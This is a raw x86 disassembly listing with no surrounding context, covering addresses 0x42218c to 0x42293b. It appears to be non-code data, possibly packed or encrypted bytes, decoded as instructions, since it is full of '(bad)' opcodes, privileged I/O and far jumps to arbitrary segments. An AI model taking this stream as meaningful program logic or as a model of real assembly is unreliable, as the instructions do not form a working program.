  42218c:	aad    0xdf
  42218e:	call   0x583d:0x43370dbc
  422195:	add    BYTE PTR [eax+edi*8+0x1e3785e9],0x4f
  42219d:	imul   BYTE PTR [ebx+0x66]
  4221a0:	jno    0x422125
  4221a2:	dec    BYTE PTR ss:[ebp-0x57d0ce88]
  4221a9:	push   eax
  4221aa:	mov    al,ds:0x6759fb01
  4221af:	mov    BYTE PTR [eax+0x6],ch
  4221b2:	dec    esp
  4221b3:	mov    bl,0xcb
  4221b5:	ins    BYTE PTR es:[edi],dx
  4221b6:	imul   eax,edx,0xaaa0dd95
  4221bc:	mov    bp,dx
  4221bf:	push   es
  4221c0:	scas   eax,DWORD PTR es:[edi]
  4221c1:	or     esi,DWORD PTR [eax]
  4221c3:	in     al,dx
  4221c4:	test   BYTE PTR [ebx+esi*8],bh
  4221c7:	sub    al,0x6f
  4221c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221ca:	cli    
  4221cb:	int3   
  4221cc:	fnstsw WORD PTR [esi+0x2f82c5d7]
  4221d2:	add    DWORD PTR [esi],edx
  4221d4:	fild   WORD PTR [esi]
  4221d6:	xchg   ebp,eax
  4221d7:	or     ecx,DWORD PTR [ecx+0x2d6287b8]
  4221dd:	fistp  QWORD PTR [edx]
  4221df:	scas   al,BYTE PTR es:[edi]
  4221e0:	dec    esi
  4221e1:	pop    ds
  4221e2:	aaa    
  4221e3:	xchg   ebx,eax
  4221e4:	sub    DWORD PTR [eax+0x80c441f],ebx
  4221ea:	fs push 0x56
  4221ed:	enter  0x34cf,0x7b
  4221f1:	sub    eax,0x9287f9fd
  4221f6:	add    DWORD PTR [edi+0x40b9b6ba],ecx
  4221fc:	ja     0x422211
  4221fe:	cdq    
  4221ff:	and    esp,edi
  422201:	dec    esp
  422202:	out    dx,al
  422203:	test   eax,0xeda1fca0
  422208:	scas   al,BYTE PTR es:[edi]
  422209:	les    esp,FWORD PTR [ecx+ecx*8]
  42220c:	jbe    0x4221a0
  42220e:	retf   
  42220f:	inc    ebp
  422210:	fdiv   QWORD PTR [esi-0x627fced]
  422216:	ds inc ebp
  422218:	or     ah,ah
  42221a:	(bad)  
  42221b:	std    
  42221c:	daa    
  42221d:	push   esi
  42221e:	neg    DWORD PTR [eax]
  422220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422221:	or     BYTE PTR [ecx+0x777fd862],cl
  422227:	cs inc ebx
  422229:	dec    edi
  42222a:	sub    eax,0x263dfebc
  42222f:	fwait
  422230:	mov    gs,edi
  422232:	(bad)  
  422233:	ja     0x422238
  422235:	in     eax,0x1e
  422237:	repnz inc ecx
  422239:	fsub   DWORD PTR [ecx]
  42223b:	mul    DWORD PTR fs:[ebx-0x39eb8c44]
  422242:	push   0xec90f6f2
  422247:	adc    BYTE PTR [edx-0x4d],dl
  42224a:	fs sbb ebx,eax
  42224d:	sub    esi,ebx
  42224f:	sub    dl,ch
  422251:	jmp    0xf47e:0xeb041897
  422258:	sbb    ebp,edx
  42225a:	xor    ah,BYTE PTR [edx+0x63]
  42225d:	xor    eax,0xd07e7471
  422262:	(bad)  
  422263:	popf   
  422264:	je     0x42226f
  422266:	fwait
  422267:	(bad)  
  422268:	fwait
  422269:	xchg   edi,eax
  42226a:	mov    ah,0xb5
  42226c:	xor    DWORD PTR [esi+0x54ec479d],edx
  422272:	push   ecx
  422273:	xor    BYTE PTR [esi+0x4a],ch
  422276:	mov    WORD PTR [ecx-0x575dc589],cs
  42227c:	and    ch,al
  42227e:	pop    esp
  42227f:	repz sbb eax,DWORD PTR [ebx+edx*2-0x1f]
  422284:	pushf  
  422285:	xor    dl,al
  422287:	or     ebx,DWORD PTR [esi-0x29f2cd36]
  42228d:	jns    0x42224c
  42228f:	jle    0x422217
  422291:	push   eax
  422292:	out    dx,al
  422293:	aad    0x33
  422295:	add    al,0xa2
  422297:	push   edi
  422298:	inc    ebp
  422299:	cmp    al,0xc8
  42229b:	xor    bh,BYTE PTR [edi]
  42229d:	dec    esp
  42229e:	cmp    al,0x21
  4222a0:	test   DWORD PTR [ecx-0x625d801c],0xda43fb8a
  4222aa:	dec    ebp
  4222ab:	and    BYTE PTR [esi-0x13],ch
  4222ae:	loope  0x422292
  4222b0:	jmp    0x422311
  4222b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222b3:	pop    ecx
  4222b4:	in     al,0xfa
  4222b6:	lea    esp,[ebp+0x105adf81]
  4222bc:	dec    eax
  4222bd:	test   BYTE PTR [eax-0x6bdbb26d],bl
  4222c3:	push   0x7320ccdc
  4222c8:	pop    edx
  4222c9:	jmp    0x4222df
  4222cb:	pop    ds
  4222cc:	xchg   esi,eax
  4222cd:	shl    BYTE PTR [eax+0x1c],0x90
  4222d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222d2:	sbb    DWORD PTR [eax+0x3f],eax
  4222d5:	push   cs
  4222d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222d7:	fwait
  4222d8:	xor    esi,ecx
  4222da:	jl     0x422325
  4222dc:	jl     0x422288
  4222de:	es push eax
  4222e0:	dec    edi
  4222e1:	mov    ecx,edi
  4222e3:	in     eax,dx
  4222e4:	out    dx,al
  4222e5:	outs   dx,DWORD PTR ds:[esi]
  4222e6:	test   BYTE PTR [esi+0x79],ah
  4222e9:	and    eax,0x8f385c36
  4222ee:	idiv   DWORD PTR [edi+esi*2]
  4222f1:	push   esp
  4222f2:	push   es
  4222f3:	das    
  4222f4:	mov    edx,0x70a8b2ee
  4222f9:	aad    0xd5
  4222fb:	xchg   edx,eax
  4222fc:	xor    DWORD PTR [ecx+0x12bf3a00],ecx
  422302:	dec    ecx
  422303:	test   ebx,edx
  422305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422306:	mov    ch,BYTE PTR [ebx-0x2f21427d]
  42230c:	(bad)  
  42230d:	iret   
  42230e:	mov    eax,?
  422310:	rcr    DWORD PTR [ebp-0x6e97b3b6],0xca
  422317:	dec    esp
  422318:	sbb    BYTE PTR [edi-0x2c],dl
  42231b:	repz ss mov esi,0xe59b4dc
  422322:	aam    0x4d
  422324:	add    eax,0x8c3a5c3c
  422329:	or     DWORD PTR [ebx],ebp
  42232b:	xchg   ebx,eax
  42232c:	mov    ch,0x4b
  42232e:	jge    0x42239b
  422330:	pushf  
  422331:	dec    eax
  422332:	xchg   ebp,eax
  422333:	jno    0x4222d4
  422335:	jae    0x4222f6
  422337:	in     eax,0xd3
  422339:	inc    ecx
  42233a:	and    al,0xba
  42233c:	or     DWORD PTR [esi+edx*8+0x7e],ebx
  422340:	or     eax,esp
  422342:	rcl    BYTE PTR [edx],0x51
  422345:	sub    eax,DWORD PTR [edi+0x26ef0c03]
  42234b:	dec    edx
  42234c:	inc    ecx
  42234d:	bound  edi,QWORD PTR [ecx+edx*4]
  422350:	pop    ebx
  422351:	loop   0x422341
  422353:	adc    cl,BYTE PTR [ebp-0xfd8049c]
  422359:	(bad)  
  42235a:	push   eax
  42235b:	enter  0x23eb,0x29
  42235f:	dec    ecx
  422360:	inc    ecx
  422361:	add    eax,0xa0396f9
  422366:	inc    ebx
  422367:	sub    eax,0xb6007c6a
  42236c:	clc    
  42236d:	push   ecx
  42236e:	dec    ebp
  42236f:	xchg   esp,eax
  422370:	sub    bh,ah
  422372:	jmp    0x7682:0xf3b11c0e
  422379:	mov    dh,0x4a
  42237b:	dec    esi
  42237c:	fadd   st(0),st
  42237e:	xchg   ah,ah
  422380:	js     0x422318
  422382:	pop    ecx
  422383:	xor    eax,0xda2af4ee
  422389:	imul   ebp,ecx,0x1f
  42238c:	enter  0xe27f,0x8a
  422390:	sub    BYTE PTR [ebx],bl
  422392:	fs xor dl,bh
  422395:	ret    
  422396:	dec    ebx
  422397:	pop    edi
  422398:	ss mov ah,0x3a
  42239b:	push   eax
  42239c:	add    esi,DWORD PTR [edx+0x41]
  42239f:	push   0xe1822717
  4223a4:	in     eax,0x99
  4223a6:	inc    ecx
  4223a7:	repz dec ecx
  4223a9:	fwait
  4223aa:	jecxz  0x422339
  4223ac:	xor    eax,0xab75112b
  4223b1:	cli    
  4223b2:	jnp    0x42235f
  4223b4:	je     0x422390
  4223b6:	enter  0xea36,0x60
  4223ba:	fxch   st(5)
  4223bc:	jmp    0x5537d82
  4223c1:	add    cl,cl
  4223c3:	xor    dl,dl
  4223c5:	sbb    ecx,ebp
  4223c7:	jmp    0xf11b:0xc1c6aab2
  4223ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223cf:	xor    al,0xb2
  4223d1:	clc    
  4223d2:	inc    ebx
  4223d3:	popa   
  4223d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223d5:	inc    esp
  4223d6:	mov    eax,ds:0xfcad74f2
  4223db:	pushf  
  4223dc:	dec    ebp
  4223dd:	pop    ebp
  4223de:	pop    ebx
  4223df:	pop    esp
  4223e0:	(bad)  
  4223e1:	pop    esi
  4223e2:	(bad)  
  4223e3:	nop
  4223e4:	add    eax,ebx
  4223e6:	push   es
  4223e7:	sub    DWORD PTR [ecx+0x13],ebp
  4223ea:	das    
  4223eb:	into   
  4223ec:	mov    ss,WORD PTR ds:0xc3683b03
  4223f2:	dec    esi
  4223f3:	ret    0x154c
  4223f6:	sbb    BYTE PTR [ecx],0xe2
  4223f9:	test   eax,0xfcfc2ccc
  4223fe:	lds    edi,FWORD PTR [eax]
  422400:	push   edx
  422401:	out    dx,al
  422402:	ds retf 
  422404:	xchg   esp,eax
  422405:	nop
  422406:	out    0xab,eax
  422408:	mov    esi,0xb15f00df
  42240d:	into   
  42240e:	sahf   
  42240f:	xor    al,BYTE PTR [ecx+ebp*2-0x7e]
  422413:	jne    0x4223f0
  422415:	jns    0x42248b
  422417:	not    DWORD PTR [ebp-0x757609b5]
  42241d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42241e:	sub    BYTE PTR ds:[eax],dl
  422421:	repnz or edx,ebp
  422424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422425:	inc    DWORD PTR [eax+edx*4+0xb]
  422429:	sbb    al,0x5d
  42242b:	jbe    0x4223f6
  42242d:	test   al,0xb3
  42242f:	fsub   QWORD PTR [ebx+0x6de574b3]
  422435:	jae    0x42241e
  422437:	pop    ss
  422438:	adc    al,0xfa
  42243a:	(bad)  
  42243c:	cli    
  42243d:	fisubr WORD PTR [ecx-0x5fd38782]
  422443:	and    eax,0x3ccbabd6
  422448:	cld    
  422449:	jl     0x4224b9
  42244b:	cmp    eax,0x6d2f2fa3
  422450:	xor    DWORD PTR [eax],0x21f74a53
  422456:	mov    dl,0xda
  422458:	xor    eax,0x2ca612d6
  42245d:	mov    al,0xee
  42245f:	cmp    esi,DWORD PTR [ebx+0x30a8e479]
  422465:	test   DWORD PTR [esi-0x6886ee81],esp
  42246b:	mov    ?,edi
  42246d:	mov    edx,0xd4d3373d
  422472:	js     0x42248d
  422474:	call   0x8eee:0x5e821ae3
  42247b:	leave  
  42247c:	xchg   edi,eax
  42247d:	push   0xfffffff2
  42247f:	ja     0x422429
  422481:	and    BYTE PTR [edi+ecx*8+0x672f1696],ch
  422488:	and    eax,0x336ef421
  42248d:	pop    DWORD PTR ds:0xdbf87d3e
  422493:	mov    ebp,0x8f3392aa
  422498:	mov    edi,0x93619d95
  42249d:	jae    0x42244c
  42249f:	sbb    BYTE PTR [ecx+0x55],al
  4224a2:	mov    ds:0x172deff4,al
  4224a7:	dec    ecx
  4224a8:	addr16 daa 
  4224aa:	lahf   
  4224ab:	mov    ?,WORD PTR ds:0xebcb24bb
  4224b1:	xor    BYTE PTR [esi],al
  4224b3:	std    
  4224b4:	or     bl,BYTE PTR [eax]
  4224b6:	cli    
  4224b7:	add    BYTE PTR [ebx-0x79e7532a],bl
  4224bd:	fimul  DWORD PTR [eax-0x5f]
  4224c0:	dec    eax
  4224c1:	mov    bh,0xdb
  4224c3:	jecxz  0x4224b5
  4224c5:	pop    ss
  4224c6:	inc    esi
  4224c7:	mov    cl,0xcd
  4224c9:	jno    0x42245b
  4224cb:	(bad)  
  4224cd:	test   BYTE PTR [eax-0x54],0x75
  4224d1:	addr16 push ds
  4224d3:	lods   eax,DWORD PTR ds:[esi]
  4224d4:	pushf  
  4224d5:	mov    bh,0x69
  4224d7:	ds (bad) 
  4224d9:	rep stos BYTE PTR es:[edi],al
  4224db:	pop    ecx
  4224dc:	sub    DWORD PTR [eiz*1-0x6fea7e5b],edi
  4224e3:	loope  0x422468
  4224e5:	leave  
  4224e6:	enter  0x20a1,0x63
  4224ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224eb:	sti    
  4224ec:	mov    DWORD PTR [edx],ebp
  4224ee:	dec    ebx
  4224ef:	sbb    BYTE PTR [edi+edx*2],0xec
  4224f3:	push   es
  4224f4:	and    bh,BYTE PTR [edi]
  4224f6:	lods   eax,DWORD PTR ds:[esi]
  4224f7:	sbb    BYTE PTR [ebx-0x5b9898ce],dl
  4224fd:	mov    BYTE PTR [ecx],ah
  4224ff:	sbb    edi,DWORD PTR [esi+0x48a4bdd3]
  422505:	or     BYTE PTR [eax],bh
  422507:	sbb    BYTE PTR [edx],bh
  422509:	int3   
  42250a:	sbb    BYTE PTR [esi],0xa9
  42250d:	stc    
  42250e:	jne    0x42250b
  422510:	and    DWORD PTR [eax+0x1b],edx
  422513:	addr16 push eax
  422515:	xchg   BYTE PTR [ecx+0x7634db2e],cl
  42251b:	cld    
  42251c:	push   0x61
  42251e:	xor    ebp,DWORD PTR [edx]
  422520:	adc    BYTE PTR [edx+eiz*1],dl
  422523:	mov    gs,WORD PTR [ecx+0x11aa6678]
  422529:	in     al,dx
  42252a:	adc    BYTE PTR [eax-0x46],cl
  42252d:	jg     0x4224f0
  42252f:	sub    eax,0xc9d40fb4
  422534:	(bad)  
  422535:	pusha  
  422536:	js     0x422549
  422538:	out    dx,eax
  422539:	je     0x422503
  42253b:	loope  0x422507
  42253d:	mov    dh,0xc3
  42253f:	jp     0x4225a7
  422541:	xcrypt-cfb (bad)
  422542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422544:	cmp    eax,0xba2b121e
  422549:	and    BYTE PTR [edx-0x24],cl
  42254c:	cmp    edx,ebx
  42254e:	imul   esi,DWORD PTR [ebx],0x3a7d49ec
  422554:	mov    edx,0x3ee12cb3
  422559:	mov    al,ds:0x5e0723e6
  42255e:	jp     0x4225a4
  422560:	test   al,0x5d
  422562:	in     eax,dx
  422563:	call   0xed80:0x804101ff
  42256a:	jge    0x42250e
  42256c:	cli    
  42256d:	mov    ds:0x79dfbd99,al
  422572:	adc    bh,BYTE PTR [eax+0x3c]
  422575:	jae    0x422533
  422577:	xchg   ebx,eax
  422578:	cmp    eax,DWORD PTR [eax+esi*8-0x7d]
  42257c:	mov    ebp,0xee7ff3a9
  422581:	mov    ?,WORD PTR [edx-0xa]
  422584:	inc    esi
  422585:	mov    dl,BYTE PTR ss:[edx+0x6]
  422589:	retf   
  42258a:	popf   
  42258b:	cld    
  42258c:	mov    bh,0x53
  42258e:	sub    BYTE PTR [eax],cl
  422590:	int3   
  422591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422592:	shr    DWORD PTR [edx+0x10],1
  422595:	cmp    eax,DWORD PTR [esi-0x58b16c0]
  42259b:	(bad)  
  42259d:	arpl   WORD PTR [ecx],bp
  42259f:	cmp    ch,ah
  4225a1:	xchg   ecx,eax
  4225a2:	jnp    0x4225d6
  4225a4:	mov    ah,0x3c
  4225a6:	inc    edx
  4225a7:	retf   
  4225a8:	pushf  
  4225a9:	pop    edi
  4225aa:	xchg   ebp,eax
  4225ab:	(bad)  
  4225ac:	xor    BYTE PTR [esi+0x430afd7e],dl
  4225b2:	nop
  4225b3:	jl     0x422555
  4225b5:	cmp    DWORD PTR [edi-0x33],edi
  4225b8:	jns    0x422586
  4225ba:	mul    DWORD PTR [edx+ecx*8]
  4225bd:	rol    ecx,1
  4225bf:	jge    0x422592
  4225c1:	je     0x422602
  4225c3:	rol    BYTE PTR [ebx+0x3a],0x9c
  4225c7:	mov    al,0x1d
  4225c9:	mov    bl,0xed
  4225cb:	cmp    eax,0x7824d8ed
  4225d0:	es push 0x1e
  4225d3:	scas   eax,DWORD PTR es:[edi]
  4225d4:	add    eax,0xa2a2cf22
  4225d9:	push   es
  4225da:	jnp    0x42257a
  4225dc:	cli    
  4225dd:	stos   DWORD PTR es:[edi],eax
  4225de:	sub    ecx,eax
  4225e0:	icebp  
  4225e1:	sbb    ebx,DWORD PTR [ebx+edi*4+0x3d53d5cf]
  4225e8:	ret    
  4225e9:	xor    BYTE PTR [edx],bl
  4225eb:	cmc    
  4225ec:	push   0x81770bd2
  4225f1:	imul   esi,esp,0x2c570ac4
  4225f7:	repnz sahf 
  4225f9:	or     BYTE PTR [ebx+0x31],dh
  4225fc:	mov    ebp,0xad570c02
  422601:	mov    cl,0xd2
  422603:	ss sub al,0x29
  422606:	icebp  
  422607:	enter  0x6c84,0xe0
  42260b:	pushf  
  42260c:	jno    0x422689
  42260e:	call   ebp
  422610:	les    eax,FWORD PTR [esi-0x6]
  422613:	and    cl,dl
  422615:	inc    esp
  422616:	mov    DWORD PTR [edx],edx
  422618:	cmp    BYTE PTR [esi],bh
  42261a:	sbb    edx,DWORD PTR [esi-0x1a991726]
  422620:	sub    al,0xa
  422622:	mov    ds:0x82f865f2,al
  422627:	mov    es:0x12491b49,al
  42262d:	popf   
  42262e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42262f:	push   0x8a0bfb38
  422634:	out    dx,eax
  422635:	xor    eax,edx
  422637:	xchg   esp,eax
  422638:	imul   ecx,ebx,0x7d
  42263b:	cmc    
  42263c:	sar    BYTE PTR [ebx-0x69],0x73
  422640:	mov    al,0x36
  422642:	scas   eax,DWORD PTR es:[edi]
  422643:	mov    ecx,0xd44f910c
  422648:	jecxz  0x4226a8
  42264a:	sub    bh,dh
  42264c:	cmp    DWORD PTR [edx+eax*8-0x2692a51a],esp
  422653:	fnstsw WORD PTR [esi+0x5c]
  422656:	inc    ecx
  422657:	cs test al,0x15
  42265a:	leave  
  42265b:	jge    0x4226d5
  42265d:	mov    bh,0xa0
  42265f:	call   0xd1f1:0xe974f4c5
  422666:	adc    BYTE PTR [ebp+0x49],0xa5
  42266a:	arpl   WORD PTR [ecx+0x4782a17a],dx
  422670:	fld    DWORD PTR [eax]
  422672:	jo     0x422666
  422674:	inc    ecx
  422675:	push   esp
  422676:	xchg   esi,eax
  422677:	jb     0x422672
  422679:	inc    ebp
  42267a:	test   DWORD PTR [ebp+0x7a],eax
  42267d:	je     0x422605
  42267f:	stos   BYTE PTR es:[edi],al
  422680:	aam    0xe
  422682:	ss (bad) 
  422685:	sub    ebp,edx
  422687:	add    al,0xfd
  422689:	in     al,0xb7
  42268b:	shr    DWORD PTR [edi+0x70],0xa1
  42268f:	fsubr  QWORD PTR [edi+0x1d]
  422692:	adc    eax,0x1ffb3594
  422697:	mov    ds:0x5f9e6a15,al
  42269c:	(bad)
  4226a0:	dec    edi
  4226a1:	xlat   BYTE PTR ds:[ebx]
  4226a2:	jbe    0x42266d
  4226a4:	adc    DWORD PTR ds:0x91d062,ecx
  4226aa:	in     eax,0x1a
  4226ac:	stos   DWORD PTR es:[edi],eax
  4226ad:	inc    edx
  4226ae:	ins    BYTE PTR es:[edi],dx
  4226af:	push   ds
  4226b0:	mov    dh,0x70
  4226b2:	sub    cl,al
  4226b4:	xchg   edx,eax
  4226b5:	popf   
  4226b6:	aam    0x2
  4226b8:	neg    esp
  4226ba:	sbb    DWORD PTR [edx+edx*2],0x32
  4226be:	(bad)  
  4226bf:	push   edi
  4226c0:	aam    0x18
  4226c2:	aam    0x74
  4226c4:	ja     0x42268e
  4226c6:	and    DWORD PTR [ebp-0x1d],edi
  4226c9:	inc    edi
  4226ca:	pop    edi
  4226cb:	push   eax
  4226cc:	cli    
  4226cd:	sub    eax,0x87df0add
  4226d2:	mov    DWORD PTR [eax+0x42b7a676],eax
  4226d8:	loopne 0x42267b
  4226da:	or     eax,0x6c9ab2f3
  4226df:	xor    dh,dl
  4226e1:	rcr    ah,cl
  4226e3:	adc    ebx,edx
  4226e5:	pop    esi
  4226e6:	pop    ebx
  4226e7:	rcr    dh,1
  4226e9:	and    cl,cl
  4226eb:	inc    edx
  4226ec:	sahf   
  4226ed:	(bad)  
  4226ee:	mov    al,0xea
  4226f0:	stos   DWORD PTR es:[edi],eax
  4226f1:	es xchg esp,eax
  4226f3:	imul   ecx,DWORD PTR [edi+ebp*2-0x51027e9a],0x18
  4226fb:	mov    esp,0xbf295139
  422700:	push   edi
  422701:	loopne 0x422748
  422703:	add    eax,0xdeedc79d
  422708:	(bad)  
  422709:	out    0x9c,eax
  42270b:	or     al,0x36
  42270d:	mov    eax,0x5e77eada
  422712:	push   ebx
  422713:	aas    
  422714:	pusha  
  422715:	adc    eax,0xef6fa4fc
  42271a:	and    BYTE PTR [edx+0x62],al
  42271d:	outs   dx,BYTE PTR ds:[esi]
  42271e:	int3   
  42271f:	fsubp  st(7),st
  422721:	shl    DWORD PTR [eax+0x79],cl
  422724:	sti    
  422725:	pop    esi
  422726:	jle    0x422732
  422728:	and    BYTE PTR [edi+0x43fd75a3],al
  42272e:	xor    bl,BYTE PTR [esi+0x79790aa3]
  422734:	xchg   DWORD PTR [edx+0x25],esi
  422737:	or     BYTE PTR [esp+esi*1],cl
  42273a:	lea    ebp,[edi+0x64]
  42273d:	mov    esp,0x8d9e32b7
  422742:	jge    0x422715
  422744:	jge    0x4226e5
  422746:	ficom  WORD PTR [eax+0x1c]
  422749:	ja     0x422746
  42274b:	out    dx,eax
  42274c:	lock popa 
  42274e:	mov    ds:0xe450792c,eax
  422753:	inc    edx
  422754:	loop   0x422735
  422756:	mov    dh,0x4c
  422758:	mov    esi,fs
  42275a:	call   0x5f85:0x557b2bc4
  422761:	fwait
  422762:	ret    
  422763:	add    al,0xb5
  422765:	pop    eax
  422766:	xchg   ebx,eax
  422767:	vsubps xmm7,xmm0,XMMWORD PTR [edx]
  42276b:	in     eax,0xe9
  42276d:	mov    dl,0x65
  42276f:	ja     0x422792
  422771:	mov    ds:0xf610aa61,al
  422776:	add    DWORD PTR [ebx+0x622db810],esp
  42277c:	pop    ebp
  42277d:	fwait
  42277e:	jmp    0x8e8b:0x4e76376e
  422785:	iret   
  422786:	data16 xor al,0xe0
  422789:	xchg   al,bh
  42278b:	test   al,0xd3
  42278d:	xchg   BYTE PTR [edi],al
  42278f:	push   es
  422790:	jae    0x4227ce
  422792:	sbb    BYTE PTR ds:0x8a824b7e,cl
  422798:	cld    
  422799:	sub    DWORD PTR [ecx-0x11],ebp
  42279c:	stos   BYTE PTR es:[edi],al
  42279d:	shr    ecx,1
  42279f:	sub    eax,edx
  4227a1:	ins    DWORD PTR es:[edi],dx
  4227a2:	test   DWORD PTR [edx+0x7982cb81],ebx
  4227a8:	cmp    cl,BYTE PTR [ebx+0x7c8f9fb7]
  4227ae:	jo     0x4227fd
  4227b0:	cwde   
  4227b1:	scas   eax,DWORD PTR es:[edi]
  4227b2:	icebp  
  4227b3:	out    0x37,al
  4227b5:	std    
  4227b6:	xchg   edx,eax
  4227b7:	and    eax,0x964819b
  4227bc:	lock add ah,BYTE PTR [esp+edx*1]
  4227c0:	retf   
  4227c1:	jmp    0x3c7ccd5d
  4227c6:	cmp    ecx,ebx
  4227c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c9:	xor    al,0xa4
  4227cb:	mov    eax,ds:0x48eac429
  4227d0:	(bad)  
  4227d1:	cmp    al,0x49
  4227d3:	(bad)  
  4227d4:	mov    ebx,0xee9f1f10
  4227d9:	jb     0x42275c
  4227db:	cmc    
  4227dc:	jmp    0xa52fa0a4
  4227e1:	and    DWORD PTR [ecx+edi*2],ebx
  4227e4:	push   esi
  4227e5:	int3   
  4227e6:	cs add eax,0x30d8e615
  4227ec:	xchg   DWORD PTR [ecx+edx*2-0x76],ecx
  4227f0:	mov    al,0xc7
  4227f2:	sbb    edx,edi
  4227f4:	pop    eax
  4227f5:	in     eax,dx
  4227f6:	out    0x93,eax
  4227f8:	adc    al,0xdb
  4227fa:	sahf   
  4227fb:	(bad)  
  4227fc:	stc    
  4227fd:	lea    edx,[ecx+0x3c]
  422800:	dec    edx
  422801:	dec    esp
  422802:	lods   al,BYTE PTR ds:[esi]
  422803:	ss fwait
  422805:	outs   dx,DWORD PTR ds:[esi]
  422806:	and    al,0x77
  422808:	xchg   ebx,eax
  422809:	push   edx
  42280a:	jmp    0x422836
  42280c:	into   
  42280d:	stos   DWORD PTR es:[edi],eax
  42280e:	cdq    
  42280f:	lods   al,BYTE PTR ds:[esi]
  422810:	js     0x422850
  422812:	fdiv   st(3),st
  422814:	mov    al,0xfd
  422816:	or     ebp,DWORD PTR [eax]
  422818:	dec    edi
  422819:	push   ebp
  42281a:	aaa    
  42281b:	cmp    eax,0x8b08bb75
  422820:	adc    al,BYTE PTR [ebp-0x43c7b985]
  422826:	popa   
  422827:	sub    edi,edi
  422829:	leave  
  42282a:	lods   al,BYTE PTR ds:[esi]
  42282b:	popa   
  42282c:	inc    ebx
  42282d:	sti    
  42282e:	hlt    
  42282f:	push   es
  422830:	daa    
  422831:	dec    ecx
  422832:	mov    edx,0xce0a20cf
  422837:	cwde   
  422838:	outs   dx,DWORD PTR ds:[esi]
  422839:	(bad)  
  42283a:	lahf   
  42283b:	lahf   
  42283c:	sbb    eax,DWORD PTR [eax-0x5e]
  42283f:	arpl   WORD PTR [eax+edi*4],sp
  422842:	mov    ch,BYTE PTR [esi+0x58]
  422845:	out    0xaa,al
  422847:	stos   DWORD PTR es:[edi],eax
  422848:	mov    esi,0x5d1a9bc9
  42284d:	rcr    DWORD PTR [eax+0x48888cb3],0x56
  422854:	mov    ch,0xc
  422856:	add    cl,BYTE PTR [edi+0x226e6c87]
  42285c:	(bad)  
  42285d:	sahf   
  42285e:	dec    esp
  42285f:	add    edx,DWORD PTR [esi+0x57a80b3a]
  422865:	(bad)  
  422866:	in     eax,dx
  422867:	pop    esi
  422868:	gs inc esi
  42286a:	push   edx
  42286b:	jmp    0x4715:0xb097e1c7
  422872:	push   ds
  422873:	jge    0x42283e
  422875:	and    eax,0xfccba059
  42287a:	inc    ebx
  42287b:	fwait
  42287c:	ret    0xb746
  42287f:	push   edi
  422880:	pop    eax
  422881:	mov    ds:0x83c3852a,eax
  422886:	inc    eax
  422887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422888:	jmp    0x422864
  42288a:	dec    cl
  42288c:	imul   ebx,DWORD PTR [ebp-0x2d],0xffffff8c
  422890:	imul   esi,DWORD PTR [edx-0x5f],0xa6e179f7
  422897:	test   DWORD PTR [edx],ebp
  422899:	sub    eax,0x1b820078
  42289e:	push   ss
  42289f:	mov    dh,0x3
  4228a1:	fsubr  st,st(5)
  4228a3:	cmp    eax,0xd69bbcbc
  4228a8:	add    si,WORD PTR [ecx-0x24db17dd]
  4228af:	sbb    al,0x7c
  4228b1:	cmp    bh,BYTE PTR [edi]
  4228b3:	cmc    
  4228b4:	xor    al,BYTE PTR [esi]
  4228b6:	das    
  4228b7:	cmp    al,0x5f
  4228b9:	sub    al,0x22
  4228bb:	jbe    0x422879
  4228bd:	push   es
  4228be:	push   ecx
  4228bf:	outs   dx,DWORD PTR ds:[esi]
  4228c0:	ins    DWORD PTR es:[edi],dx
  4228c1:	xchg   esp,eax
  4228c2:	mov    BYTE PTR [eax],0x4d
  4228c5:	mov    edx,0x1ace31f9
  4228ca:	mov    al,0xc4
  4228cc:	and    DWORD PTR [ebx+0xe],edi
  4228cf:	push   ebp
  4228d0:	out    0xb5,al
  4228d2:	push   ss
  4228d3:	mov    BYTE PTR [esi],ah
  4228d5:	test   DWORD PTR [ebx],esi
  4228d7:	dec    edi
  4228d8:	add    eax,0xe5cfd90
  4228dd:	push   edx
  4228de:	(bad)  
  4228e0:	pop    esp
  4228e1:	aad    0xf
  4228e3:	dec    ebp
  4228e4:	cs pop ss
  4228e6:	popa   
  4228e7:	test   al,0x40
  4228e9:	xchg   ecx,eax
  4228ea:	aad    0x7e
  4228ec:	outs   dx,BYTE PTR ds:[esi]
  4228ed:	ss mov edi,0x3961a461
  4228f3:	mov    ebx,0xcd256454
  4228f8:	pop    ebx
  4228f9:	pop    eax
  4228fa:	ret    0x88e5
  4228fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228fe:	lahf   
  4228ff:	iret   
  422900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422901:	clc    
  422902:	mov    cl,0x9d
  422904:	or     edx,ebp
  422906:	repnz fbstp TBYTE PTR [esi+0x38]
  42290a:	dec    ecx
  42290b:	ficomp WORD PTR [ebp+0x33a7fc0d]
  422911:	or     eax,0x5b0ac59b
  422916:	xlat   BYTE PTR ds:[ebx]
  422917:	sti    
  422918:	popaw  
  42291a:	in     eax,0x22
  42291c:	adc    eax,edi
  42291e:	aad    0xef
  422920:	push   eax
  422921:	cmp    BYTE PTR [edx+ebx*4+0x5a],dl
  422925:	jnp    0x4228f1
  422927:	bound  esi,QWORD PTR [ebp+0x3b]
  42292a:	(bad)  
  42292b:	sahf   
  42292c:	xchg   ecx,edx
  42292e:	call   0xed81:0x122eae36
  422935:	sbb    BYTE PTR [ecx+edi*8+0x33],al
  422939:	pop    esi
  42293a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42293b:	sbb    BYTE PTR [edi],al
